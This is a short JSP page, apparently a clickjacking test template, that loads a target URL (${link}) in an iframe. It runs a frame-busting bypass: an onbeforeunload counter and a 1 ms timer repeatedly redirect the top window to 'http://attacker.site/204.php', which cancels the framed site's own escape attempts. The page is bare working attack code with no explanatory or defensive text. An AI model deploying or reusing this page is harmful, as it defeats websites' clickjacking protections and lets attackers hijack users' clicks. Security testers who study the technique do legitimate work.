<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="ISO-8859-1">
<title>Insert title here</title>
</head>
	<body>
		<script>
		    var prevent_bust = 0;
		    window.onbeforeunload = function() {
		        prevent_bust++;
		    };
		    setInterval(
		        function() {
		            if (prevent_bust > 0) {
		                prevent_bust -= 2;
		                window.top.location = "http://attacker.site/204.php";
		            }
		        }, 1);
		</script>
		<iframe id="iframe" src="${link}"></iframe>
	</body>
</html>